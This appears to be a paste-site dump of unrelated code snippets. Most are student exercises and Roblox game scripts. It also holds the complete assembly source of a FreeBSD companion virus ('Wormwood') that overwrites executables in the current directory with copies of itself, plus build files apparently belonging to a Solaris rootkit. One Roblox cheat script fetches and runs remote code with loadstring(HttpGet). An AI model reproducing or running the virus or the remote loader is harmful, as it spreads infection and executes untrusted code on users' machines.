sendNotification(""Style Loaded"")
task.wait(1)

---Badge 
pgui.Interface.Battle.Main.GUY.GUY.Image = ""rbxassetid://13919012508""
----------------Tab names
menu.Abilities.Frame.Frame.Frame.Tabs.Tabs.Brawler.Filled.Title.Text = ""Dragon""
menu.Abilities.Frame.Frame.Frame.Tabs.Tabs.Rush.Filled.Title.Text = ""Rush""
menu.Abilities.Frame.Frame.Frame.Tabs.Tabs.Beast.Filled.Title.Text = ""Beast""
-----------------Ability Names
menu.Abilities.Frame.Frame.Frame.List.ListFrame[""Counter Hook""].Generic.Label.Text = ""Komaki Tiger Drop""
menu.Abilities.Frame.Frame.Frame.List.ListFrame[""Guru Parry""].Generic.Label.Text = ""Komaki Parry""
menu.Abilities.Frame.Frame.Frame.List.ListFrame[""Time for Resolve""].Generic.Label.Text = ""Red Dragon Spirit""
menu.Abilities.Frame.Frame.Frame.List.ListFrame[""Finishing Hold""].Generic.Label.Text = ""Essence of Sumo Slapping""
menu.Abilities.Frame.Frame.Frame.List.ListFrame[""Ultimate Essence""].Generic.Label.Text = ""Ultimate Essence""
menu.Abilities.Frame.Frame.Frame.List.ListFrame[""Guru Dodge Shot""].Generic.Label.Text = ""Komaki Dodge Shot""
menu.Abilities.Frame.Frame.Frame.List.ListFrame[""Guru Spin Counter""].Generic.Label.Text = ""Komaki Fist Reversal""
menu.Abilities.Frame.Frame.Frame.List.ListFrame[""Guru Firearm Flip""].Generic.Label.Text = ""Komaki Shot Stopper""
menu.Abilities.Frame.Frame.Frame.List.ListFrame[""Guru Knockback""].Generic.Label.Text = ""Komaki Knockback""
menu.Abilities.Frame.Frame.Frame.List.ListFrame[""Guru Safety Roll""].Generic.Label.Text = ""Komaki Safety Roll""
--------------------------Ability descriptions and prompts
abilFolder[""Time for Resolve""].Description.Value = ""Unleash the willpower of the Legendary Red Dragon to fly above the rest and withstand any attacks that would stagger or knock you down.""
abilFolder[""Guru Parry""].Description.Value = ""One of the Three Ultimate Komaki style moves. Stuns the enemy.""
abilFolder[""Counter Hook""].Description.Value = ""One of the Three Ultimate Komaki style moves. The style's strongest counter-attack.""
abilFolder[""Counter Hook""].Prompt.Value = ""Get in Stance with LOCK ON, then HEAVY ATTACK when the enemy attacks.""
abilFolder[""Finishing Hold""].Description.Value = ""One of the Best Komaki moves. Slap an enemy repeatedly till they fall.""
abilFolder[""Finishing Hold""].Prompt.Value = ""Get in Stance with LOCK ON and whilst distanced, HEAVY ATTACK.""
abilFolder[""Ultimate Essence""].Prompt.Value = ""Get in Stance with LOCK ON and with Full Heat, HEAVY ATTACK""
abilFolder[""Ultimate Essence""].Description.Value = ""The Ultimate Komaki Ability. Gain the Power to destroy every type of enemy.""
sendNotification(""Badge and ability names loaded"")
task.wait(0.5)
sendNotification(""Mod Loaded"")"
VepchhsF,jumps2,b_gandurov,C#,Friday 17th of May 2024 10:18:06 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

class Program
{
    static void Main()
    {
        int N = int.Parse(Console.ReadLine());
        string init = Console.ReadLine();
        int[] elements = init.Split().Select(int.Parse).ToArray();
        int[] jumps = new int[N];
        Stack<int> indexStack = new Stack<int>();
        int maxJumps = 0;
        for (int i = 0; i < elements.Length-1; i++)
        {
            int initialIndex = i;
            if (jumps[i] == 0)
            {
                int count = 1;
                for (int j = i; j < elements.Length; j++)
                {
                    if ((elements[j] > elements[initialIndex]))
                    {
                        if (jumps[j] != 0)
                        {
                            count = jumps[j]+1;
                            indexStack.Push(initialIndex);
                            break;
                        }
                        indexStack.Push(initialIndex);
                        initialIndex = j;
                    }
                }
                while (indexStack.Count > 0)
                {
                    int index = indexStack.Pop();
                    jumps[index] = count;
                    count++;
                    maxJumps = Math.Max(maxJumps, jumps[index]);
                }
            }
        }
        Console.WriteLine(maxJumps);
        Console.WriteLine(string.Join("" "", jumps));
    }
}"
kGMbsZq1,HWPTI_2024_Blatt2_Aufgabe1,madegoff,VHDL,Friday 17th of May 2024 10:14:54 AM CDT,"------------------------------------------------------------------------------
--	Paket fuer die Funktionen zur die Abbildung von ARM-Registeradressen
-- 	auf Adressen des physischen Registerspeichers (5-Bit-Adressen)
------------------------------------------------------------------------------
--	Datum:		05.11.2013
--	Version:	0.1
------------------------------------------------------------------------------

library ieee;
use ieee.std_logic_1164.all;
library work;
use work.ArmTypes.all;

--------------------------------------------------------------------------------
--	Bezeichner fuer die verschiedenen Registeradressen
--------------------------------------------------------------------------------
	subtype RegAddress is std_logic_vector(3 downto 0);
	constant R0	: RegAddress := ""0000"";
	constant R1	: RegAddress := ""0001"";
	constant R2	: RegAddress := ""0010"";
	constant R3	: RegAddress := ""0011"";
	constant R4	: RegAddress := ""0100"";
	constant R5	: RegAddress := ""0101"";
	constant R6	: RegAddress := ""0110"";
	constant R7	: RegAddress := ""0111"";
	constant R8	: RegAddress := ""1000"";
	constant R9	: RegAddress := ""1001"";
	constant R10	: RegAddress := ""1010"";
	constant R11	: RegAddress := ""1011"";
	constant R12	: RegAddress := ""1100"";
	constant R13	: RegAddress := ""1101"";
	constant R14	: RegAddress := ""1110"";
	constant R15	: RegAddress := ""1111"";
--------------------------------------------------------------------------------

package ArmRegaddressTranslation is
  
	function get_internal_address(
		EXT_ADDRESS: std_logic_vector(3 downto 0); 
		THIS_MODE: std_logic_vector(4 downto 0); 
		USER_BIT : std_logic) 
	return std_logic_vector;

end package ArmRegaddressTranslation;

package body ArmRegAddressTranslation is

function get_internal_address(
	EXT_ADDRESS: std_logic_vector(3 downto 0);
	THIS_MODE: std_logic_vector(4 downto 0); 
	USER_BIT : std_logic) 
	return std_logic_vector 
is
    Signal res : std_logic_vector(4 downto 0) := (others => '0');
    Signal d_out: integer;
--------------------------------------------------------------------------------		
--	Raum fuer lokale Variablen innerhalb der Funktion
--------------------------------------------------------------------------------

	begin
--------------------------------------------------------------------------------		
--	Functionscode
--------------------------------------------------------------------------------	

   process(EXT_ADDRESS, USER_BIT, THIS_MODE)
   begin	
    --fuer register R0-R7 unabhaengig vom modi einfach die gleiche adresse
    if((unsigned(EXT_ADDRESS) >=R0 and unsigned(EXT_ADDRESS) <=R7 or unsigned(EXT_ADDRESS) == R15 or
        USER_BIT = 1) then
            res(3 downto 0) <= EXT_ADDRESS;
            
    --fuer register R8-R12 entweder normal die gleiche adresse ODER wenn Mode = FIQ inkrementieren
    elsif (unsigned(EXT_ADDRESS) >= R8 and unsigned(EXT_ADDRESS) <= 12)) then
        if(THIS_MODE = FIQ) then
            d_out <= (to_integer(unsigned(EXT_ADRESS)) + 8); 
            res <= to_std_logic_vector(d_out);
        else res(3 downto 0) <= EXT_ADDRESS;
        
     --fuer restlichen register je nach mode 
     else
        if(THIS_MODE = IRQ) then
            d__out <= (to_integer(unsigned(EXT_ADRESS)) + 10); 
            res <= to_std_logic_vector(d_out);
        elsif(THIS_MODE = SUPERVISOR) then
            d__out <= (to_integer(unsigned(EXT_ADRESS)) + 12); 
            res <= to_std_logic_vector(d_out);
        elsif(THIS_MODE = UNDEFINED) then
            d__out <= (to_integer(unsigned(EXT_ADRESS)) + 14);
            res <= to_std_logic_vector(d_out);
        end if;
        
    end process;
    
	return res;			

end function get_internal_address;	
	 
end package body ArmRegAddressTranslation;"
TxFG3pVu,bruh,lokot0k,Python,Friday 17th of May 2024 10:05:43 AM CDT,"id = 0
results = set() # thread-safe set
errors = set() # thread-safe set
####### sverxy menyat nelzya #########

def f():
	id += 1
	try:
		res = calc(id)
	except:
		errors.add(id)
	finally:
		results.add(res)
# neobxodimo chtob obrabotalis vse id ot 1 do 10


##### snizu menyat nelzya ##########
for _ in range(10):
	multiprocessing.Process(target=f).start()"
yMbK1L7j,Jumps,b_gandurov,C#,Friday 17th of May 2024 09:37:34 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

class Program
{
    static void Main()
    {
        int N = int.Parse(Console.ReadLine());
        string init = Console.ReadLine();
        int[] elements = init.Split().Select(int.Parse).ToArray();
        int[] jumps = new int[N];
        Stack<int> indexStack = new Stack<int>();
        int maxJumps = 0;
        for (int i = 0; i < elements.Length; i++)
        {
            int initialIndex = i;
            if (jumps[i] == 0)
            {
                for (int j = i; j < elements.Length; j++)
                {
                    if ((elements[j] > elements[initialIndex]))
                    {
                        indexStack.Push(initialIndex);
                        initialIndex = j;
                    }
                }
                int count = 1;
                while (indexStack.Count > 0)
                {
                    int index = indexStack.Pop();
                    jumps[index] = count;
                    count++;
                    maxJumps = Math.Max(maxJumps, jumps[index]);
                }
            }
        }
        Console.WriteLine(maxJumps);
        Console.WriteLine(string.Join("" "", jumps));
    }
}"
abevA8Jp,Untitled,niqxwe,Lua,Friday 17th of May 2024 09:12:01 AM CDT,"getgenv()._=
""This script made by xk5ng | If you pay for this script you get scammed, this script is completely free ok https://discord.gg/msgabv2t9Q | https://discord.gg/stando""
--[[To get started in ""OWNER"" put the username you want to control and in ""STAND"" put the StandUsername aka AltUsername.

// Example \\

getgenv().Accounts = {OWNER = 'xk5ng', STAND = ""4k7nz""} This is just the example dont put the username here ]]

--\\-- Accounts --//--

getgenv().Accounts = {OWNER = 'Sai2k24', STAND = ""mcbrent115""}

--\\-- Stand-Configuration --//--

getgenv().StandConfig = {
    --\\-- ! Main ! --//--
    ['Position'] = 'Back', --Position Of Stand [Back | Left | Right]
    ['CrewID'] = 32570691, --Must Be In Group For It To Work
    ['Attack'] = 'Heavy', --Heavy = Super Punch Light = Spam Punch [Heavy | Light]
    ['StandMode'] = 'TheWorld', --[Star Platinum : OverHeaven | Star Platinum: The World | Star Platinum, Za Warudo! | TheWorld | Cmoon | King Crimson | Killer Queen | MIH | D4C]
    ['FlyMode'] = 'Glide', --[Glide | FlyV1 | FlyV2 | Hover | Heaven ]
    ['Pred'] = 0.34, --Prediction For Attack Or Targetting
    ['AutoPred'] = 0.23, --Prediction For Attack Or Targetting
    ['GunPred'] = 0.037, --Gun prediction [this is auto prediction sets]
    ['AutoPredic'] = false, --[true | false] Turn On Or Off Auto Prediction 
    ['AttackMode'] = 'Sky', --[Sky | Under] If [Sky] The Stand Will Attack Infront Of Target And If [Under] The Stand Will Attack In Underground
    ['GunMode'] = 'Under', --[Sky | Under]  The Stand Will Shooting Just Like What In The Settings
    ['GunType'] = 'Lmg', --[Lmg | Aug]  The Stand Will Shooting Just Like What In The Settings
    ['Resolver'] = false, --[true | false] Turn On Or Off Resolver If Someone Using Anti Lock
    --\\-- ! Antilock ! --//--
    ['SkyAmount'] = 1600, --Sky Velocity
    --\\-- ! Misc ! --//--
    ['AutoSaveLocation'] = '2', --[1 | 2]. '1' is bank food shop rooftop, '2' is ""DA FURNITURE"" Rooftop
    ['AttackDistance'] = 75, --Attack distance for ""Attack!, Stab!, Gkill!"" max distance
    ['MutePremium'] = true, --Only for premium (this make ur stand cant be controlled by other premium)
    ['TPMode'] = ""Cart"", --[Knock | Cart]
    ['Smoothing'] = false, --[true | false] If [false] Less Delays And if [true] The Stand Movement Will Smooth But Kinda Delayed
    ['CustomPrefix'] = '.', --[ ! | / | . | ? | > | < | $ | ; | : ] Custom target prefix
    ['CustomSummon'] = 'Summon!', --Custom [Summon!] Text
    ['SummonPoses'] = 'Pose1', --[false | Pose1 | Pose2 | Pose3]
    ['LowGraphics'] = true, --[true | false] Turns graphics down so your stand doesnt lag too much
    ['AntiStomp'] = true, --[true | false] The Stand Will Cannot Be Stomped Or Grabbed
    ['CustomNAME'] = 'Master', --Custom Name Text Default Is [Master] Example Of it 'Im Here, Master'
    ['Hidescreen'] = true, --[true | false] If [true] You WIll See White Blank Screen But The Performance Is Gonna Be Good]
    ['ChatCmds'] = true, --[true | false] Chatted When You Use Some Command
    ['MaskMode'] = 'Breathing', --[Surgeon | Paintball | Skull | Pumpkin | Hockey | Ninja | Riot | Breathing] The Stand Will Buy The Mask You Selected
    ['AutoMask'] = true, --[true | false] Auto Buy Mask When The St    and Respawn
    ['FPSCAP'] = false, --[false | 'NUMBER'] This is so your main account gets the most fps (MAXED IS 60, SUGGEST 30 FPS ON STANDS)
    ['Msg'] = 'Yare Yare Daze.', --When You Say [/e msg] It Makes All The Alts Say That Message
    ['Alt'] = false, --keep this false
    --//    ! Sounds !     \\--
    --\\ MUST HAVE BOOMBOX //--
    ['Sounds'] = true, --[true | false]
    ['CustomSong'] = 6703926669, --Enter A Song ID And Say 'Song!'
    ['SummonMusic'] = true, --[true | false]
    ['SummonMusicID'] = 'Default' -- Enter a Sound ID Put [Default] If You Would Like The Default Sound
}loadstring(game:HttpGet(""https://xk5ng.github.io/V4.6""))()"
9CQQjX3F,Untitled,sadov_a,C++,Friday 17th of May 2024 09:11:17 AM CDT,"#include <iostream>
#include <vector>
#include <random>
#include <chrono>
#include <algorithm>

class Miner {
private:
    size_t n;
    size_t mines;
    std::vector<bool> line;
    std::vector<bool> click;
    size_t clicked = 0;
    bool lost = false;
    std::mt19937 rnd;


    int get_count(size_t i) {
        int ans = 0;
        if (i > 0) {
            ans += line[i - 1];
        }
        if (i + 1 < n) {
            ans += line[i + 1];
        }
        return ans;
    }

public:
    Miner(size_t n, size_t mines): n(n), mines(mines), line(n), click(n), 
            rnd(std::chrono::high_resolution_clock::now().time_since_epoch().count()) 
    {
        for (size_t i = 0; i < mines; ++i) {
            line[i] = true;
        }
        std::shuffle(line.begin(), line.end(), rnd);
    }

    int click_square(size_t i) {
        if (line[i]) {
            lost = true;
            return -1;
        }
        if (!click[i]) {
            ++clicked;
        }
        click[i] = true;
        return get_count(i);
    }

    int game_result() {
        if (lost) {
            return -1;
        }
        if (clicked == n - mines) {
            return 1;
        }
        return 0;
    }
};

void middle_solver_helper(int l, int r, std::vector<int>& line, Miner& miner) {
    if (l > r) return;
    int m = (l + r) / 2;
    if (line[m] == -2) {
        line[m] = miner.click_square(m);
    }
    if (line[m] >= 0) {
        if (m >= 2 && line[m - 1] == 1) {
            line[m - 2] = -1;
        } else if (m + 2 < line.size() && line[m + 1] == 1) {
            line[m + 2] = -1;
        }
    }
    // std::cerr << l << ' ' << m << ' ' << r << ' ' << line[m] << std::endl;
    if (line[m] == 2) {
        line[m - 1] = line[m + 1] = -1;
        middle_solver_helper(l, m - 2, line, miner);
        middle_solver_helper(m + 2, r, line, miner);
        return;
    }
    if (line[m] == 0) {
        for (int j = m - 1; j >= l; --j) {
            line[j] = miner.click_square(j);
            if (line[j] == 1) {
                line[j - 1] = -1;
                middle_solver_helper(l, j - 2, line, miner);
                break;
            }
        }
        for (int j = m + 1; j <= r; ++j) {
            line[j] = miner.click_square(j);
            if (line[j] == 1) {
                line[j + 1] = -1;
                middle_solver_helper(j + 2, r, line, miner);
                break;
            }
        }
        return;
    }
    if (line[m] == 1) {
        if (m == 0 || line[m - 1] >= 0) {
            line[m + 1] = -1;
        } else if (m + 1 == line.size() || line[m + 1] >= 0) {
            line[m - 1] = -1;
        }
    }
    middle_solver_helper(l, m - 1, line, miner);
    middle_solver_helper(m + 1, r, line, miner);
}

void middle_solver(size_t n, size_t mines, Miner& miner) {
    std::vector<int> line(n, -2);
    middle_solver_helper(0, n - 1, line, miner);
}

void random_solver(size_t n, size_t mines, Miner& miner) {
    std::vector<int> line(n, -2);
    std::vector<size_t> order(n);
    std::iota(order.begin(), order.end(), 0);
    std::mt19937 rnd(std::chrono::high_resolution_clock::now().time_since_epoch().count());
    std::shuffle(order.begin(), order.end(), rnd);
    for (size_t i : order) {
        if (miner.game_result() == 1) {
            break;
        }
        if (line[i] != -2) {
            continue;
        }
        line[i] = miner.click_square(i);
        if (line[i] == -1) {
            return;
        }
        if (line[i] == 2) {
            line[i - 1] = line[i + 1] = -1;
        } else if (line[i] == 1) {
            if (i == 0 || line[i - 1] >= 0) {
                line[i + 1] = -1;
            } else if (i == n - 1 || line[i + 1] >= 0) {
                line[i - 1] = -1;
            }
        } else if (line[i] == 0) {
            for (int j = static_cast<int>(i) - 1; j >= 0; --j) {
                line[j] = miner.click_square(j);
                if (line[j] > 0) {
                    line[j - 1] = -1;
                    break;
                }
            }
            for (int j = i + 1; j < n; ++j) {
                line[j] = miner.click_square(j);
                if (line[j] > 0) {
                    line[j + 1] = -1;
                    break;
                }
            }
        }
    }
}

void simple_solver(size_t n, size_t mines, Miner& miner) {
    std::vector<int> line(n, -2);
    for (size_t i = 0; i < n; ++i) {
        if (line[i] != -2) {
            continue;
        }
        line[i] = miner.click_square(i);
        if (line[i] == -1) {
            return;
        }
        int next = line[i] - (i > 0 && line[i - 1] == -1);
        if (next) {
            line[i + 1] = -1;
        }
    }
}

int main() {
    size_t n = 10000, mines = 90, rep = 10000, won = 0;
    for (size_t i = 0; i < rep; ++i) {
        Miner miner(n, mines);
        middle_solver(n, mines, miner);
        won += miner.game_result() == 1;
    }
    std::cout << ""won "" << won << "" out of "" << rep << std::endl;
}"
B4UHQ14d,Untitled,sadov_a,C++,Friday 17th of May 2024 09:10:45 AM CDT,"#include <iostream>
#include <set>

using std::cin, std::cout, std::endl;

int main() {
    int q;
    cin >> q;
    std::multiset<int> elements;
    auto median = elements.end();
    int n = 0;
    for (int op = 0; op < q; ++op) {
        char type;
        int x;
        cin >> type >> x;
        if (type == '+') {
            elements.insert({x, op});
            if (x >= *median && n % 2 == 0) {
                ++median;
            } else if (x < *median && n % 2 == 1) {
                --median;
            }
            ++n;
        } else {
            auto it = elements.lower_bound(x);
            if (it == median) {
                if (n % 2 == 0) {
                    ++median;
                } else {
                    --median;
                }
            } else if (*it > *median && n % 2 == 1) {
                --median;
            } else if (*it < *median && n % 2 == 0) {
                ++median;
            }
            elements.erase(it);
            --n;
        }
        if (n == 0) {
            cout << ""set is empty"" << endl;
        } else {
            cout << ""median is "" << *median << endl;
        }
    }
}"
YcapQB8y,Сумма чисел,NikaBang,C#,Friday 17th of May 2024 08:51:18 AM CDT,"using System;

internal class Program
{
    static void Main(string[] args)
    {
        int minRandom = 0;
        int maxRandom = 101;
        int number;
        int sumNumber = 0;
        int multipleNumber1 = 3;
        int multipleNumber2 = 5;

        Random random = new Random();
        number = random.Next(minRandom, maxRandom);

        for (int i = 0; i <= number; i++)
        {
            if (i % multipleNumber1 == 0 || i % multipleNumber2 == 0)
            {
                sumNumber += i;
            }
        }

        Console.WriteLine($""Сумма чисел входящие в число {number} которые кратные {multipleNumber1} или {multipleNumber2} равняется: {sumNumber}"");
        Console.ReadKey();
    }
}"
4DvBc5rY,Makefile,FlyFar,Make,Friday 17th of May 2024 08:35:07 AM CDT,"#
# SInAR Makefile - Copyright as per normal in LICENSE
# WOO HOO!!! SUN finally give us a FREE compiler by default!
CC=gcc
#CFLAGS= -Wall -m64 -D_KERNEL -DSVR4 -DSOL2 -c 
CFLAGS= -Wall -D_KERNEL -DSVR4 -DSOL2 -D__i386 -c
#LFLAGS= -64 -r
LFLAGS= -r
all: sinar
	 
clean:
	rm -f *.o sinar *.*~
	
sinar:
	$(CC) $(CFLAGS) sinar.c -o sinar.o
	ld $(LFLAGS) sinar.o -o sinar
"
fPx6hhkn,opcodes.h,FlyFar,C,Friday 17th of May 2024 08:33:48 AM CDT,"/*
 * Copyright (c) 2004 by Archim
 * All rights reserved.
 *
 * For License information please see LICENSE (that was unexpected wasn't it!).
 *
 *
 */

#ifndef __i386
struct sethi_opcode
{
  unsigned op:2;
  unsigned regd:5;
  unsigned op2:3;
  unsigned imm:22;
};

typedef struct sethi_opcode sethi_t;

struct or_opcode
{

  unsigned op:2;
  unsigned regd:5;
  unsigned op3:6;
  unsigned rs1:5;
  unsigned i_fl:1;
  unsigned imm:13;

};

typedef struct or_opcode or_t;



struct nop_opcode
{
  unsigned nopc:32;
};

typedef struct nop_opcode nop_t;

struct jmp_opcode {
  unsigned start:2;
  unsigned regdest:5;
  unsigned op3:6;
  unsigned rs1:5;
  unsigned i_fl:1;
  unsigned simm13:13;
};

typedef struct jmp_opcode jmp_t;

  sethi_t sethop;
  or_t orop;
  jmp_t jop;
  nop_t nop;

#else
// come on I did some of the work for you.
struct jmpl_opcode{
unsigned offs:16; 
unsigned dest:32;
  unsigned sig:8;
};

struct nop_opcode{
  unsigned nopc:8;
};

typedef struct jmpl_opcode jmpl_t;
typedef struct nop_opcode nop_t;


jmpl_t jmpl_op;
nop_t nop_op;

#endif
"
qirquft7,OpenBSD.Virus.Wormwood - Source Code,FlyFar,6502 TASM/64TASS,Friday 17th of May 2024 08:24:56 AM CDT,"#
#                             [FreeBSD.Wormwood]
#
# Simple FreeBSD virus. Written as a test of a posibility of writing FreeBSD
# virus on a pure assembly. Infection way is a companion method - creation of
# the spawned hiden file, which is running after all viral actions complete.
# Very easy to understand and well good as a first step to the FreeBSD assembly
# coding.
#
# To compile:
# -----------
# as -o wormwood.o wormwood.s
# ld -s -o wormwood wormwood.o
#
# 31/08/01

.include		""syscall.inc""
.include		""freebsd.inc""
.include		""dirent.inc""

VIRUS_SIZE		= 1200	# Hardcoded size, check it before run!!!

			.text
			.globl _start
###############################################################################
#                                  Virus                                      #
###############################################################################
_start:
_VirusStart:
# Save the 1st command line argument (argv[0]) offset
# (it is the name of the currently runned file)
			movl	4(%esp), %eax		# argv[0]
			movl	%eax, _OurNameOffset

# Open current directory for read only
                        pushl   $O_RDONLY
                        pushl   $_Directory
                        movl    $SYS_open, %eax
                        pushl   %eax
                        int	$0x80

                        jnc	1f
			addl    $12, %esp		# If an error
			jmp	_ExitVirus		# Go out 
1:
			addl	$12, %esp
                        xchgl   %eax, %ebx

# Read directory structure
_ReadInfoBlock:
                        pushl	$S_BLKSIZE
			movl    $_InfoBlock, %ecx
                        pushl   %ecx
                        pushl   %ebx
                        movl    $SYS_getdents, %eax
                        pushl   %eax
                        int	$0x80
                        addl    $16, %esp

                        orl	%eax, %eax
                        jz	_ExitVirus              # if there's no filez
1:
			call	_ProcessFile		# Call infection

			movzwl	d_reclen(%ecx), %edx
			addl	%edx, %ecx

			movl	%ecx, %edx
			subl	$_InfoBlock, %edx

			cmpl	%eax, %edx
			jl	1b 
			jmp     _ReadInfoBlock

###############################################################################
#                            INFECTION PROCEDURE                              #
###############################################################################
_ProcessFile:		
			pushal

# Do some checks for loyality
			testw	$DT_REG, d_type(%ecx)	# is it a regular file?	
			jz	_EndFile

			cmpb	$0x2e, d_name(%ecx)	# check for DOT at the
			je	_EndFile		# name beggining
			
# Did we find ourself?
			pushl	%ecx
			popl	%ebx

			movl	_OurNameOffset, %edi
			cmpw	$0x2f2e, (%edi)		# skip ""./"" at start
			jne	1f
			incl	%edi
			incl	%edi
1:
			leal	d_name(%ecx), %esi
			pushl	%edi
			xorl	%eax, %eax
			repne
			scasb
			popl	%ecx
			xchgl	%ecx, %edi
			subl	%edi, %ecx
			rep
			cmpsb
			je	_EndFile

			xchgl	%ebx, %ecx

# Can we execute the file?
			pushl	$X_OK			# check for execute
			leal	d_name(%ecx), %eax	# permissions
			pushl	%eax
			movl	$SYS_access, %eax
			pushl	%eax
			int	$0x80
			addl	$12, %esp

			orl	%eax, %eax
			jnz	_EndFile

# Create the companion name (put the DOT before the name)
			movb	$'.', d_namlen(%ecx)	# the same offset as
							# d_name - 1

# Check the presention of the companion file
			pushl	$F_OK
			leal	d_namlen(%ecx), %eax	# same as d_name - 1
			pushl	%eax
			movl	$SYS_access, %eax
			pushl	%eax
			int	$0x80
			addl	$12, %esp

			orl	%eax, %eax		# file is presented
			jz	_EndFile		# means ""infected""

# Open ourself
			pushl	$O_RDONLY
			pushl	_OurNameOffset
			movl	$SYS_open, %eax
			pushl	%eax
			int	$0x80

			jnc	1f
			addl	$12, %esp
			jmp	_EndFile
1:
			addl	$12, %esp
			xchgl	%eax, %ebx

# Read ourself to the buffer
			pushl	$VIRUS_SIZE
			pushl	$_Buffer
			pushl	%ebx
			movl	$SYS_read, %eax
			pushl	%eax
			int	$0x80
			addl	$16, %esp

# Close ourself
			pushl	%ebx
			movl	$SYS_close, %eax
			pushl	%eax
			int	$0x80
			addl	$8, %esp

# Rename founded file to the companion
			leal	d_namlen(%ecx), %eax
			pushl	%eax
			leal	d_name(%ecx), %eax
			pushl	%eax
			movl	$SYS_rename, %eax
			pushl	%eax
			int	$0x80
			addl	$12, %esp

			orl	%eax, %eax
			jnz	_EndFile

# Create infected file
			pushl	$S_IRWXU|S_IRGRP|S_IXGRP|S_IROTH|S_IXOTH
			pushl	$O_WRONLY|O_CREAT|O_EXCL
			leal	d_name(%ecx), %eax
			pushl	%eax
			movl	$SYS_open, %eax
			pushl	%eax
			int	$0x80
			addl	$16, %esp

# Write virus to the victim
			pushl	$VIRUS_SIZE
			pushl	$_Buffer
			pushl	%ebx
			movl	$SYS_write, %eax
			pushl	%eax
			int	$0x80
			addl	$16, %esp

# Close victim
			pushl	%ebx
			movl	$SYS_close, %eax
			pushl	%eax
			int	$0x80
			addl	$8, %esp

_EndFile:		
			popal
			ret

###############################################################################
#                                EXIT VIRUS                                   #
###############################################################################
_ExitVirus:
# Prepare the string with our companion file name in the _Buffer
# (PAY ATTENTION: buffer should be greater then MAXNAMELEN!!!)
			movb	$'.', _Buffer
			movl	_OurNameOffset, %esi
			movl	$_Buffer+1, %edi
			lodsw
			cmpw	$0x2f2e, %ax		# skip ""./"" at start
			je	_NextSymbol
			stosw
_NextSymbol:		
			lodsb
			orb	%al, %al
			jz	_EndOfTheNameString
			stosb
			jmp	_NextSymbol
_EndOfTheNameString:
			stosb

# Put the address of the name to the Argv[0]
			movl	$_Buffer, %eax
			movl	%eax, 4(%esp)

# Get the Envp[] offset
			movl	%esp, %eax
			pushl	%eax
			popl	%ebx
			addl	$4, %ebx		# %ebx = Argv[]
			movl	(%esp), %ecx
			shll	$2, %ecx
			addl	$8, %ecx		# add Argc and 0
			addl	%ecx, %eax		# %eax = Envp
			
# Execute file
			pushl	%eax			# offset Envp[]
			pushl	%ebx			# offset Argv[]
			pushl	$_Buffer		# offset file name
			movl	$SYS_execve, %eax
			pushl	%eax
			int	$0x80			# we don't clear stack
							# after this syscall
							# because there is
							# an error anyway

# We are still here? This means an error
			pushl	$_RevelationL
			pushl	$_Revelation
			pushl	$STDOUT
			movl	$SYS_write, %eax
			pushl	%eax
			int	$0x80
			
			jmp	.			# endless loop
	
###############################################################################
#                            VIRUS DATA STRUCTURE                             #
###############################################################################
			.data
_Directory:		.asciz  "".""
_Name:			.ascii	""[FreeBSD.Wormwood]""
_Revelation:		.ascii	""\n\nREV.8:10 The third angel sounded his trumpet,\n""
			.ascii	""         And a great star, blazing like a torch,\n""
			.ascii	""         Fell from the sky on a third of the rivers\n""
			.ascii	""         And on the springs of water -\n""
			.ascii	""REV.8:11 The name of the star is Wormwood.\n""
			.ascii	""         A third of the waters turned bitter,\n""
			.ascii	""         And many people died from the waters\n""
			.ascii	""         That had become bitter.\n\n""
_RevelationL		=	. - _Revelation

			.bss
_OurNameOffset:		.int	0
_InfoBlock:             .skip   S_BLKSIZE, 0
_Buffer:		.skip	VIRUS_SIZE, 0
"
zXABhHmY,Number of Provinces,jayati,C++,Friday 17th of May 2024 08:20:48 AM CDT,"class Solution {
public:
    void dfs(int node, vector<vector<int>>& isConnected, vector<bool>& visit) {
        visit[node] = true;
        for (int i = 0; i < isConnected.size(); i++) {
            if (isConnected[node][i] && !visit[i]) {
                dfs(i, isConnected, visit);
            }
        }
    }

    int findCircleNum(vector<vector<int>>& isConnected) {
        int n = isConnected.size();
        int numberOfComponents = 0;
        vector<bool> visit(n);

        for (int i = 0; i < n; i++) {
            if (!visit[i]) {
                numberOfComponents++;
                dfs(i, isConnected, visit);
            }
        }

        return numberOfComponents;
    }
};"
GQNCyCv8,minimal spanning tree,_who___,Python,Friday 17th of May 2024 08:12:38 AM CDT,"from scipy.optimize import linprog
import numpy as np
import networkx as nx
import matplotlib.pyplot as plt
np.set_printoptions(threshold=np.inf)

def random_matrix(N, max_value):
    graph = np.zeros((N, N))
    for i in range(N):
        edges = np.random.choice(np.delete(np.arange(N), i), 2, replace=False)
        for j in edges:
            graph[i, j] = np.random.randint(1, 100)

    return graph

def visualize_overlapping_graphs(graph1_array, graph2_array, node_color='pink', edge_color1='lightgray', edge_color2='black'):
  graph1 = nx.from_numpy_array(graph1_array)
  graph2 = nx.from_numpy_array(graph2_array)
  combined_graph = nx.compose(graph1, graph2)
  pos = nx.circular_layout(combined_graph, scale=0.8)  # Круговое расположение
  nx.draw(combined_graph, pos, node_color=node_color, with_labels=False)
  edges1 = list(graph1.edges())
  nx.draw_networkx_edges(combined_graph, pos, edgelist=edges1, edge_color=edge_color1, width=2)
  edges2 = list(graph2.edges())
  nx.draw_networkx_edges(combined_graph, pos, edgelist=edges2, edge_color=edge_color2, width=1)
  plt.show()

def visualize_overlapping_oriented_circular_graphs(graph1_array, graph2_array, node_color='pink', edge_color1='lightgray', edge_color2='black'):
    from scipy.optimize import linprog
    import numpy as np
    import networkx as nx
    import matplotlib.pyplot as plt
    np.set_printoptions(threshold=np.inf)

    def random_matrix(N, max_value):
        graph = np.zeros((N, N))
        for i in range(N):
            edges = np.random.choice(np.delete(np.arange(N), i), 2, replace=False)
            for j in edges:
                graph[i, j] = np.random.randint(1, 100)

        return graph

    def visualize_overlapping_graphs(graph1_array, graph2_array, node_color='pink', edge_color1='lightgray',
                                     edge_color2='black'):
        graph1 = nx.from_numpy_array(graph1_array)
        graph2 = nx.from_numpy_array(graph2_array)
        combined_graph = nx.compose(graph1, graph2)
        pos = nx.circular_layout(combined_graph, scale=0.8)  # Круговое расположение
        nx.draw(combined_graph, pos, node_color=node_color, with_labels=False)
        edges1 = list(graph1.edges())
        nx.draw_networkx_edges(combined_graph, pos, edgelist=edges1, edge_color=edge_color1, width=2)
        edges2 = list(graph2.edges())
        nx.draw_networkx_edges(combined_graph, pos, edgelist=edges2, edge_color=edge_color2, width=1)
        plt.show()

